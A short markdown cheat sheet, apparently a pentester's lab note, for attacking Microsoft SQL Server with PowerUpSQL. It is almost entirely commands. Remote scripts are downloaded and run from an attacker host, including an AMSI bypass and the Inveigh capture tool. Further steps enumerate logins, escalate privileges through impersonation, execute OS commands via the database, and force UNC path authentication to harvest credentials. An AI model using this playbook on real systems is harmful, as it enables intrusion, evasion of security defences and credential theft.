# PowerUpSQL

Backup if all else fails

### 1) Open powershell shell

    shell


### 2) Load the scripts 

    IEX(New-Object Net.webclient).downloadString("http://10.10.10.11/powershell-scripts/amsi.txt")
    IEX(New-Object Net.webclient).downloadString("http://10.10.10.11/powershell-scripts/PowerUpSQL.ps1")
    IEX(New-Object Net.webclient).downloadString("http://10.10.10.11/powershell-scripts/Inveigh.ps1")


### 3) Run SQL Queries for enumeration

    Get-SQLQuery -Instance "192.168.130.10" -Query "select @@servername"
    Get-SQLQuery -Instance "192.168.130.10" -Query "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;"
    Get-SQLQuery -Instance "192.168.130.10" -Query "EXECUTE AS login = 'webuser'; SELECT SYSTEM_USER;"


### 4) Escalate privs using impersonation and run command

    Invoke-SQLEscalatePriv -Verbose -Instance 192.168.130.10
    Invoke-SQLOSCmd -Instance 192.168.130.10 -Command "whoami"


### 5) Run SQL Queries for checking impersonation

    Get-SQLQuery -Instance "192.168.130.10" -Query "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;"


### 6) UNC Lookup

    Invoke-SQLUncPathInjection -Instance 192.168.130.10 -Verbose -CaptureIp 10.10.10.11
